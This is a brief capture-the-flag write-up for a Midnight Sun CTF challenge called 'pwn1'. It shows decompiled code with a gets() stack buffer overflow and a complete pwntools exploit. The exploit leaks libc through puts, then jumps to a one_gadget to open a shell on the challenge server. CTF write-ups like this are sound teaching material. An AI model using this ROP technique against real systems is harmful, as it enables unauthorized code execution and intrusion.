# pwn1
> LongChampion, 06/04/2020

## Challenge
Look at `main` function:
```cpp
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf; // [rsp+0h] [rbp-40h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  alarm(0x3Cu);
  sub_400687();
  printf("buffer: ");
  gets(&buf);
  return 0LL;
}
```
Yeah, easy BOF challenge! I use ROP to solve it: first ROP is used to leak libc base, and second ROP is used to trigger one_gadget.

## Solution
```python
#!/usr/bin/env python2
from pwn import *
context.binary = "./pwn1"

puts_got = 0x602018
puts_plt = 0x400550
pop_rdi = 0x400783
main = 0x400698


r = remote("pwn1-01.play.midnightsunctf.se", 10001)
lib = ELF("./libc.so")

payload1 = 'A' * 0x40 + p64(0) + p64(pop_rdi) + \
    p64(puts_got) + p64(puts_plt) + p64(main)
r.sendlineafter("buffer:", payload1)
Leak = r.recvline()[1:-1]
print "Leak = ", Leak
puts = u64(Leak.ljust(8, '\0'))
log.info("puts: " + hex(puts))
LIBC = puts - lib.symbols["puts"]
log.success("LIBC: " + hex(LIBC))

payload2 = 'A' * 0x40 + p64(0) + p64(LIBC + 0x4f2c5)
r.sendlineafter("buffer:", payload2)
r.interactive()
```